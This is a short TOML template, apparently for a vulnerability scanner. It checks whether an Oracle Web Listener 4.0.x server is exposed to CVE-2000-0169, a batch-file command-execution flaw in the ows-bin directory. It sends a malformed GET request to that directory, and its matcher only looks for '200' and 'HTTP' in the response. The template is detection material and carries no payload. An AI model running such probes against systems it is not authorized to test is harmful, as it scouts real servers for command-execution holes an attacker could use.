[info]
author = "ave"
description = "检测 Oracle Web Listener 4.0.x 的 ows-bin 目录是否存在可执行批处理文件，通过发送包含 ?& 的畸形 URL 验证命令执行漏洞"
id = "POC-AVE-2000-0520"
name = "Oracle Web Listener ows-bin Batch File Command Execution PoC"
severity = "high"
tags = ["cve-2000-0169"]
vuln_id = [
    "CVE-2000-0169",
    "AVE-2000-0520",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ows-bin/&"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "HTTP",
]
